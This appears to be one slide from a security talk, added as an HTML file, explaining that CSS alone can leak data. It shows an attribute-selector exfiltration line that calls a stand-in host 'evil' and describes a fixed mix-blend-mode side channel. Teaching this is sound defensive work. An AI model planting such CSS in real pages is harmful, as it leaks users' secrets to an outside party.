@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<title>18 / 37 - CSS as an Attack Vector</title>
+<style>
+  html,body{ margin:0; padding:0; background:#000; }
+  section{ position:relative; width:1920px; height:1080px; overflow:hidden; box-sizing:border-box; }
+  section aside{ display:none; }
+  body{ position:relative; width:1920px; height:1080px; }
+  .nav a{ position:absolute; bottom:20px; display:inline-block; padding:10px 18px;
+           background:#0c0f14; color:#e8ecf1; border:1px solid #2a313c; border-radius:10px;
+           font-family:monospace; font-size:20px; text-decoration:none; }
+  .nav a:hover{ border-color:#6fd3c6; }
+  .nav .prev{ left:24px; }
+  .nav .next{ right:24px; }
+  .nav .count{ left:912px; width:96px; text-align:center; color:#8b97a3; }
+</style>
+</head><body>
+<section id="no1" data-transition="fade" style="background:#14181F;color:#E8ECF1;font-family:'IBM Plex Sans', Arial, sans-serif;padding:104px 128px;display:flex;flex-direction:column;gap:30px">
+<div style="display:flex;align-items:baseline;gap:32px">
+<h2 style="font-size:150px;font-weight:700;line-height:0.9;color:#FF5C49">No.</h2>
+<p style="font-size:40px;font-weight:600;line-height:1.2;color:#E8ECF1">JavaScript was never the only thing that runs.</p>
+</div>
+<p style="font-size:33px;line-height:1.4;color:#C2CCD6;max-width:1620px">CSS reads and exfiltrates data on its own &mdash; no script required.</p>
+<div style="display:flex;gap:28px;align-items:stretch">
+<div style="flex:1;background:#0C0F14;border:1px solid #2A313C;border-radius:14px;padding:38px;display:flex;flex-direction:column;gap:16px">
+<p style="font-family:'JetBrains Mono', monospace;font-size:22px;color:#6FD3C6">EXFILTRATION</p>
+<p style="font-size:29px;line-height:1.4;color:#C2CCD6">Attribute selectors + <i>background:url()</i> leak a secret one character at a time.</p>
+<p style="font-family:'JetBrains Mono', monospace;font-size:24px;line-height:1.4;color:#FF8A7A">input[value^=&quot;a&quot;]{background:url(//evil/a)}</p>
+</div>
+<div style="flex:1;background:#0C0F14;border:1px solid #2A313C;border-radius:14px;padding:38px;display:flex;flex-direction:column;gap:16px">
+<p style="font-family:'JetBrains Mono', monospace;font-size:22px;color:#6FD3C6">SIDE-CHANNEL &middot; CVE-2017-15417</p>
+<p style="font-size:29px;line-height:1.4;color:#C2CCD6"><i>mix-blend-mode</i> timing leaked a logged-in user's Facebook name &amp; photo across origins.</p>
+<p style="font-size:24px;color:#8B97A3">Fixed in Chrome 63 / Firefox 60.</p>
+</div>
+</div>
+<p style="font-family:'JetBrains Mono', monospace;font-size:26px;color:#8B97A3;border-left:4px solid #FF5C49;padding:4px 0 4px 32px">Stripping scripts narrows the attack surface. It doesn't close it.</p>
+<aside>First real payoff. The idea to cement: "no JavaScript" is the single most common false sense of security, and it's wrong &mdash; CSS can make network requests (background:url) and can read data via attribute selectors that match a secret character by character, firing a request per guess. The side-channel card is the jaw-dropper: mix-blend-mode let a page time its own rendering to read pixels from a cross-origin Facebook iframe and recover your name and profile picture. Keep the code line readable; don't dwell on syntax. ~70 seconds. Then: "fine, I'll sanitize the CSS."</aside>
+</section>
+<div class="nav">
+<a class="prev" href="slide-17.html">&lsaquo; Prev</a>
+<a class="count" href="index.html">18 / 37</a>
+<a class="next" href="slide-19.html">Next &rsaquo;</a>
+</div>
+</body></html>
